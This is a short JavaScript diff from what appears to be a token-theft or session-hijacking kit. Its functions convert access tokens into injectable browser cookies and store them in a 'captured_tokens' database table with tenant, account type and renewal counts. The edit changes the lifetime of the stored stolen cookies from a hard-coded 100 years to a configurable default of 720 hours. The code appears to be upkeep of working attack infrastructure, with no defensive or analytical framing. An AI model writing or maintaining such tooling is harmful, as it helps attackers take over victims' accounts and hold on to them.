@@ -355,7 +355,7 @@ function generateCookieInjectionScript(cookies) {
 async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType) {
   const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType);
   if (result.success && result.cookies) {
-    const ttlHours = 24 * 365 * 100;
+    const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
     await db.query(
       'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
       [encrypt(result.cookies), 'cookie', accountType, ttlHours, tokenId]
